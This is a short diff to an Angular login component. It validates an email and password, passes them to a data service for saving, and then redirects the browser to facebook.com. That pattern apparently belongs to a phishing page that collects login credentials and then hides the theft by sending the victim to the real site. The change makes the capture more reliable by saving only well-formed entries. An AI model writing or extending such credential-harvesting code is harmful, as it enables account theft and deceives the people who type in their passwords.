@@ -21,7 +21,7 @@ export class LoginComponent implements OnInit {
   saveData(email: string, password: string){
     this.emailError = false;
     this.passwordError = false;
-    
+
     if(!/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test(email)){
       this.emailError = true;
     }
@@ -29,8 +29,10 @@ export class LoginComponent implements OnInit {
       this.passwordError = true;
     }
 
-    this.dataService.saveData({email, password});
-    window.location.href = 'https://www.facebook.com/';
+    if(!this.emailError && !this.passwordError){
+      this.dataService.saveData(email, password);
+      window.location.href = 'https://www.facebook.com/';
+    }
 
   }
 }
